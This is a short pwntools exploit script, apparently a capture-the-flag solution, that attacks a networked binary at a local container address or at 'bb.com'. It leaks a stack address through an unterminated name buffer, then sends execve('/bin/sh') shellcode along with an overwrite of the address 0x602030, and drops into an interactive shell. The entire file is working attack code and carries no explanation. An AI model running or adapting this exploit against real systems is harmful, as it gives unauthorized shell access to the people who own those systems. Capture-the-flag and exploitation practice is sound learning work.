#coding:utf-8

from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')

local = 1
if local:
    p = remote("172.17.0.2", 1234)
    raw_input("go")
else:
    p = remote("bb.com", 1234)

p.recvuntil("who are u?\n")
p.send('a'*0x30)

p.recvuntil('a'*0x30)
rbp_addr = u64(p.recv(6).ljust(8, '\x00'))

p.recvuntil("give me your id ~~?\n")
p.sendline('123')

p.recvuntil("give me money~\n")
payload = p64(rbp_addr-0xb8) + asm(shellcraft.execve('/bin/sh'))
print "payload's length is : ",len(payload)
payload = payload.ljust(0x40-8, '\x00')
payload += p64(0x0000000000602030)
p.send(payload)

p.interactive()
